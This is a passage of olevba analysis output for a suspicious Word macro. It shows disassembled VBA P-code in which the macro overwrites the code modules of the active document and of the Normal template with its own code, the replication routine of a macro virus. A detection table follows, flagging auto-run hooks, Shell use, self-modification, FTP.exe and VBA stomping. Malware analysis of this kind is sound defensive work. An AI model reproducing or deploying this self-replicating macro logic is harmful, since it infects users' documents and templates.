' 	LitStr 0x00AA "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #132:
' 	Label YYNXLVEHTD 
' 	Ld ResetMe 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St ResetMe 
' Line #133:
' 	Label DDCYUEWWK 
' 	StartWithExpr 
' 	Ld ActCarrier 
' 	With 
' Line #134:
' 	Label UQBOICEEXJX 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #135:
' 	Label RAIDFTHT 
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #136:
' 	Label NHVTUGFMKA 
' 	EndWith 
' Line #137:
' 	Label GQYTPXRKLGG 
' 	StartWithExpr 
' 	Ld NormCarrier 
' 	With 
' Line #138:
' 	Label JSJVBI 
' 	Ld W 
' 	St IIIII 
' Line #139:
' 	Ld YYY 
' 	St WWWWWW 
' Line #140:
' 	Label PGCQNB 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #141:
' 	Label GKYOOEPXS 
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #142:
' 	Ld QQQQQQ 
' 	St NNNN 
' Line #143:
' 	Label JTMRLO 
' 	Ld OOOOOO 
' 	St MMMM 
' Line #144:
' 	Ld III 
' 	St JJJJJJ 
' Line #145:
' 	Label NHKIELEJBUD 
' 	EndWith 
' Line #146:
' 	Label JOHQQG 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #147:
' 	Label IIMAILUC 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #148:
' 	Ld False 
' 	St LL 
' Line #149:
' 	Label FLRCREOVR 
' 	Ld FFFFF 
' 	St QQQQQQ 
' Line #150:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

